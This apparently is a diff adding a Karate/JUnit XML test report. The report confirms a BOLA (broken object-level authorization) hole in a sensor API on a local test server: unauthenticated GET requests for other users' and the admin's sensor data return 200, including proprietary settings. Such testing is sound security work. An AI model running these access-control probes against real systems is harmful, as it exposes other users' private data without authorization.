@@ -1,0 +1,19 @@
+<testsuite failures="0" name="ID_001_krtestoas_users_user_id_sensors_GET_verified.feature" skipped="0" tests="1" time="2.019733"><testcase classname="ID_001_krtestoas_users_user_id_sensors_GET_verified" name="Verify access to other users' sensor data without proper authorization" time="2.019733"><system-out>* url 'http://192.168.1.109:48080' ........................................ passed
+Given path '/users/user1/sensors' ......................................... passed
+When method get ........................................................... passed
+Then status 200 ........................................................... passed
+And match response != null ................................................ passed
+And match response['TEMP001'] != null ..................................... passed
+Given path '/users/premium_user/sensors' .................................. passed
+When method get ........................................................... passed
+Then status 200  # This SHOULD fail with 403 but doesn't due to the BOLA vulnerability . passed
+And match response != null ................................................ passed
+And match response['TEMP004'] != null ..................................... passed
+And match response['TEMP004'].sensitive_data != null ...................... passed
+And match response['TEMP004'].sensitive_data.proprietary_settings != null . passed
+Given path '/users/admin/sensors' ......................................... passed
+When method get ........................................................... passed
+Then status 200  # Again, should require authorization but doesn't ........ passed
+And match response != null ................................................ passed
+</system-out></testcase>
+</testsuite>
